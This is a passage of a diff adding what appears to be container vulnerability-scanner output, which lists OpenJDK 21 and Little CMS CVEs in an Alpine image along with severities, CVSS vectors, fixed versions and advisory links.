+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-60147.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-60147 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-60147 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:15.407Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:49:46.977Z 
+│                       ├ [7]  ╭ VulnerabilityID : CVE-2026-47010 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47010 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:a34a954abf8c042f00548b3308068e007b6e8e1573824b688e609
+│                       │      │                   90ccf733b8e 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance JPEG handling (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: ImageIO).  Supported versions that are affected
+│                       │      │                    are Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Difficult to exploit vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in  unauthorized update, insert or
+│                       │      │                   delete access to some of Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition accessible data.
+│                       │      │                   Note: This vulnerability can be exploited by using APIs in
+│                       │      │                   the specified Component, e.g., through a web service which
+│                       │      │                   supplies data to the APIs. This vulnerability also applies
+│                       │      │                   to Java deployments, typically in clients running sandboxed
+│                       │      │                   Java Web Start applications or sandboxed Java applets, that
+│                       │      │                   load and run untrusted code (e.g., code that comes from the
+│                       │      │                   internet) and rely on the Java sandbox for security. CVSS
+│                       │      │                   3.1 Base Score 3.7 (Integrity impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N). 
+│                       │      ├ Severity        : LOW 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 1 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L
+│                       │      │                           │           /A:N 
+│                       │      │                           ╰ V3Score : 3.7 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47010 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47010.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47010 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47010 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:06.497Z 
+│                       │      ╰ LastModifiedDate: 2026-07-31T15:13:21.283Z 
+│                       ├ [8]  ╭ VulnerabilityID : CVE-2026-47059 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47059 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:b5453870dd60a9dc7886266308e7ed1ba7f77f611834e267ea229
+│                       │      │                   233ae4ad698 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance AWT ImagingLib (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: 2D).  Supported versions that are affected are
+│                       │      │                   Oracle Java SE: 8u491, 8u491-perf, 11.0.31, 17.0.19,
+│                       │      │                   21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and
+│                       │      │                     21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18.
+│                       │      │                   Difficult to exploit vulnerability allows unauthenticated
+│                       │      │                   attacker with network access via multiple protocols to
+│                       │      │                   compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle
+│                       │      │                   GraalVM Enterprise Edition.  Successful attacks of this
+│                       │      │                   vulnerability can result in unauthorized ability to cause a
+│                       │      │                   partial denial of service (partial DOS) of Oracle Java SE,
+│                       │      │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.
+│                       │      │                   Note: This vulnerability applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
+│                       │      │                   applications or sandboxed Java applets, that load and run
+│                       │      │                   untrusted code (e.g., code that comes from the internet) and
+│                       │      │                    rely on the Java sandbox for security. This vulnerability
+│                       │      │                   does not apply to Java deployments, typically in servers,
+│                       │      │                   that load and run only trusted code (e.g., code installed by
+│                       │      │                    an administrator). CVSS 3.1 Base Score 3.7 (Availability
+│                       │      │                   impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L). 
+│                       │      ├ Severity        : LOW 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 1 
+│                       │      │                  ╰ rocky      : 3 
+│                       │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                           │           /A:L 
+│                       │      │                           ╰ V3Score : 3.7 
+│                       │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-47059 
+│                       │      │                  ├ [2] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [20]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [29]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [30]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [31]: https://linux.oracle.com/cve/CVE-2026-47059.html 
+│                       │      │                  ├ [32]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [33]: https://nvd.nist.gov/vuln/detail/CVE-2026-47059 
+│                       │      │                  ├ [34]: https://www.cve.org/CVERecord?id=CVE-2026-47059 
+│                       │      │                  ╰ [35]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:17:11.727Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:51:30.65Z 
+│                       ├ [9]  ╭ VulnerabilityID : CVE-2026-62574 
+│                       │      ├ PkgID           : openjdk21-jre@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre@21.0.11_p10-r0?arch=x86_
+│                       │      │                  │       64&distro=3.24.1 
+│                       │      │                  ╰ UID : f569ce2a974c0718 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-62574 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:e251e68000065806d90da308de4a022bad991bfcd2a902aaf8122
+│                       │      │                   4ca1587d026 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: Install).  Supported versions that are affected
+│                       │      │                    are Oracle Java SE: 8u491, 11.0.31, 17.0.19, 21.0.11,
+│                       │      │                   25.0.3, 26.0.1; Oracle GraalVM for JDK: 17.0.19 and 
+│                       │      │                   21.0.11; Oracle GraalVM Enterprise Edition: 21.3.18. Easily
+│                       │      │                   exploitable vulnerability allows low privileged attacker
+│                       │      │                   with logon to the infrastructure where Oracle Java SE,
+│                       │      │                   Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition
+│                       │      │                   executes to compromise Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                       │      │                   of this vulnerability can result in takeover of Oracle Java
+│                       │      │                   SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise
+│                       │      │                   Edition. CVSS 3.1 Base Score 7.8 (Confidentiality, Integrity
+│                       │      │                    and Availability impacts).  CVSS Vector:
+│                       │      │                   (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H). 
+│                       │      ├ Severity        : UNKNOWN 
+│                       │      ├ CweIDs           ─ [0]: CWE-284 
+│                       │      ├ References       ─ [0]: https://www.oracle.com/security-alerts/cpujul2026.html 
+│                       │      ├ PublishedDate   : 2026-07-21T22:19:09.667Z 
+│                       │      ╰ LastModifiedDate: 2026-08-03T18:37:03.21Z 
+│                       ├ [10] ╭ VulnerabilityID : CVE-2026-41254 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ SeveritySource  : nvd 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-41254 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:005869fdc4d5ffc14c1840075cd858f722529de836151482dca02
+│                       │      │                   a867198cc81 
+│                       │      ├ Title           : Little CMS: lcms2: mm2/Little-CMS: Little CMS: Information
+│                       │      │                   disclosure or denial of service via integer overflow in
+│                       │      │                   CubeSize 
+│                       │      ├ Description     : Little CMS (lcms2) through 2.18 has an integer overflow in
+│                       │      │                   CubeSize in cmslut.c because the overflow check is performed
+│                       │      │                    after the multiplication. 
+│                       │      ├ Severity        : HIGH 
+│                       │      ├ CweIDs           ╭ [0]: CWE-696 
+│                       │      │                  ╰ [1]: CWE-190 
+│                       │      ├ VendorSeverity   ╭ alma       : 3 
+│                       │      │                  ├ amazon     : 2 
+│                       │      │                  ├ azure      : 2 
+│                       │      │                  ├ julia      : 3 
+│                       │      │                  ├ nvd        : 3 
+│                       │      │                  ├ oracle-oval: 3 
+│                       │      │                  ├ redhat     : 2 
+│                       │      │                  ├ rocky      : 3 
+│                       │      │                  ╰ ubuntu     : 2 
+│                       │      ├ CVSS             ╭ julia  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                  │        │           /A:H 
+│                       │      │                  │        ╰ V3Score : 7.5 
+│                       │      │                  ├ nvd    ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N
+│                       │      │                  │        │           /A:H 
+│                       │      │                  │        ╰ V3Score : 7.5 
+│                       │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N
+│                       │      │                           │           /A:H 
+│                       │      │                           ╰ V3Score : 6.1 
+│                       │      ├ References       ╭ [0] : https://abhinavagarwal07.github.io/posts/lcms2-cubesi
+│                       │      │                  │       ze-overflow/ 
+│                       │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:42895 
+│                       │      │                  ├ [2] : https://access.redhat.com/security/cve/CVE-2026-41254 
+│                       │      │                  ├ [3] : https://bugzilla.redhat.com/2459420 
+│                       │      │                  ├ [4] : https://bugzilla.redhat.com/2502751 
+│                       │      │                  ├ [5] : https://bugzilla.redhat.com/2502782 
+│                       │      │                  ├ [6] : https://bugzilla.redhat.com/2502783 
+│                       │      │                  ├ [7] : https://bugzilla.redhat.com/2502784 
+│                       │      │                  ├ [8] : https://bugzilla.redhat.com/2502791 
+│                       │      │                  ├ [9] : https://bugzilla.redhat.com/2502792 
+│                       │      │                  ├ [10]: https://bugzilla.redhat.com/2502793 
+│                       │      │                  ├ [11]: https://bugzilla.redhat.com/2503636 
+│                       │      │                  ├ [12]: https://bugzilla.redhat.com/show_bug.cgi?id=2459420 
+│                       │      │                  ├ [13]: https://bugzilla.redhat.com/show_bug.cgi?id=2502751 
+│                       │      │                  ├ [14]: https://bugzilla.redhat.com/show_bug.cgi?id=2502782 
+│                       │      │                  ├ [15]: https://bugzilla.redhat.com/show_bug.cgi?id=2502783 
+│                       │      │                  ├ [16]: https://bugzilla.redhat.com/show_bug.cgi?id=2502784 
+│                       │      │                  ├ [17]: https://bugzilla.redhat.com/show_bug.cgi?id=2502791 
+│                       │      │                  ├ [18]: https://bugzilla.redhat.com/show_bug.cgi?id=2502792 
+│                       │      │                  ├ [19]: https://bugzilla.redhat.com/show_bug.cgi?id=2502793 
+│                       │      │                  ├ [20]: https://bugzilla.redhat.com/show_bug.cgi?id=2503636 
+│                       │      │                  ├ [21]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-41254 
+│                       │      │                  ├ [22]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46917 
+│                       │      │                  ├ [23]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-46968 
+│                       │      │                  ├ [24]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47010 
+│                       │      │                  ├ [25]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47021 
+│                       │      │                  ├ [26]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47027 
+│                       │      │                  ├ [27]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47059 
+│                       │      │                  ├ [28]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-47063 
+│                       │      │                  ├ [29]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-20
+│                       │      │                  │       26-60147 
+│                       │      │                  ├ [30]: https://errata.almalinux.org/10/ALSA-2026-42895.html 
+│                       │      │                  ├ [31]: https://errata.rockylinux.org/RLSA-2026:42899 
+│                       │      │                  ├ [32]: https://github.com/mm2/Little-CMS/commit/da6110b1d14a
+│                       │      │                  │       bc394633a388209abd5ebedd7ab0 
+│                       │      │                  ├ [33]: https://github.com/mm2/Little-CMS/commit/e0641b1828d0
+│                       │      │                  │       a1af5ecb1b11fe22f24fceefd4bc 
+│                       │      │                  ├ [34]: https://github.com/mm2/Little-CMS/security/advisories
+│                       │      │                  │       /GHSA-4xp6-rcgg-m9qq 
+│                       │      │                  ├ [35]: https://linux.oracle.com/cve/CVE-2026-41254.html 
+│                       │      │                  ├ [36]: https://linux.oracle.com/errata/ELSA-2026-42899.html 
+│                       │      │                  ├ [37]: https://lists.debian.org/debian-lts-announce/2026/05/
+│                       │      │                  │       msg00014.html 
+│                       │      │                  ├ [38]: https://nvd.nist.gov/vuln/detail/CVE-2026-41254 
+│                       │      │                  ├ [39]: https://ubuntu.com/security/notices/USN-8209-1 
+│                       │      │                  ├ [40]: https://ubuntu.com/security/notices/USN-8209-2 
+│                       │      │                  ├ [41]: https://www.cve.org/CVERecord?id=CVE-2026-41254 
+│                       │      │                  ╰ [42]: https://www.openwall.com/lists/oss-security/2026/04/1
+│                       │      │                          7/16 
+│                       │      ├ PublishedDate   : 2026-04-18T07:16:10.807Z 
+│                       │      ╰ LastModifiedDate: 2026-06-17T10:46:23.47Z 
+│                       ├ [11] ╭ VulnerabilityID : CVE-2026-47063 
+│                       │      ├ PkgID           : openjdk21-jre-headless@21.0.11_p10-r0 
+│                       │      ├ PkgName         : openjdk21-jre-headless 
+│                       │      ├ PkgIdentifier    ╭ PURL: pkg:apk/alpine/openjdk21-jre-headless@21.0.11_p10-r0?
+│                       │      │                  │       arch=x86_64&distro=3.24.1 
+│                       │      │                  ╰ UID : e50dcf6a51ec8089 
+│                       │      ├ InstalledVersion: 21.0.11_p10-r0 
+│                       │      ├ FixedVersion    : 21.0.12_p8-r0 
+│                       │      ├ Status          : fixed 
+│                       │      ├ Layer            ╭ Digest: sha256:e75cbaefc0433d7c5850cec05a6c533ef54d45c19126
+│                       │      │                  │         4e4c9f62e347164a4006 
+│                       │      │                  ╰ DiffID: sha256:6fa3fec420de0c2f78798883e529d478f398e7489ffa
+│                       │      │                            77bbbb6e1ea62d15f4ee 
+│                       │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-47063 
+│                       │      ├ DataSource       ╭ ID  : alpine 
+│                       │      │                  ├ Name: Alpine Secdb 
+│                       │      │                  ╰ URL : https://secdb.alpinelinux.org/ 
+│                       │      ├ Fingerprint     : sha256:ad69e8cfb07a69dd12301c265f76a755c00a5ace2c3ba976edca0
+│                       │      │                   baf75b5c402 
+│                       │      ├ Title           : openjdk: OpenJDK: Enhance Jar handling (Oracle CPU 2026-07) 
+│                       │      ├ Description     : Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK,
+│                       │      │                    Oracle GraalVM Enterprise Edition product of Oracle Java SE
+│                       │      │                    (component: Libraries).  Supported versions that are
+│                       │      │                   affected are Oracle Java SE: 8u491, 8u491-perf, 11.0.31,
+│                       │      │                   17.0.19, 21.0.11, 25.0.3, 26.0.1; Oracle GraalVM for JDK:
+│                       │      │                   17.0.19 and  21.0.11; Oracle GraalVM Enterprise Edition:
+│                       │      │                   21.3.18. Easily exploitable vulnerability allows
+│                       │      │                   unauthenticated attacker with network access via multiple
+│                       │      │                   protocols to compromise Oracle Java SE, Oracle GraalVM for
+│                       │      │                   JDK, Oracle GraalVM Enterprise Edition.  Successful attacks
+│                       │      │                   of this vulnerability can result in  unauthorized creation,
+│                       │      │                   deletion or modification access to critical data or all
+│                       │      │                   Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM
+│                       │      │                   Enterprise Edition accessible data. Note: This vulnerability
+│                       │      │                    can be exploited by using APIs in the specified Component,
+│                       │      │                   e.g., through a web service which supplies data to the APIs.
+│                       │      │                    This vulnerability also applies to Java deployments,
+│                       │      │                   typically in clients running sandboxed Java Web Start
